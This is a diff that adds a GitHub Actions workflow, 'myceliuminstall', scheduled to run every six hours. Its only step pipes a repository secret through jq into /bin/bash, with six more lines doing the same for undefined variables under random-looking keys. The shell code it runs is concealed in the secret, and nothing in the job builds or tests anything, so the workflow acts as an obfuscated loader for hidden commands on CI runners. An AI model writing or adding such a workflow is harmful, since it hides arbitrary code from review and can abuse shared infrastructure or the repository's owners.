@@ -1,0 +1,25 @@
+name: myceliuminstall
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: myceliuminstall
+        env:
+          cyv2: ${{ secrets.cyv2 }}
+        run: |
+          echo $cyv2 | jq -r .js6 | /bin/bash
+          echo $tar887 | jq -r .bqw32 | /bin/bash
+          echo $okfby345 | jq -r .ysl6 | /bin/bash
+          echo $t98213 | jq -r .syfo6 | /bin/bash
+          echo $hvf6 | jq -r .b3485 | /bin/bash
+          echo $wjbgb6 | jq -r .xwjh1665 | /bin/bash
+          echo $c5659 | jq -r .rh38865 | /bin/bash
+
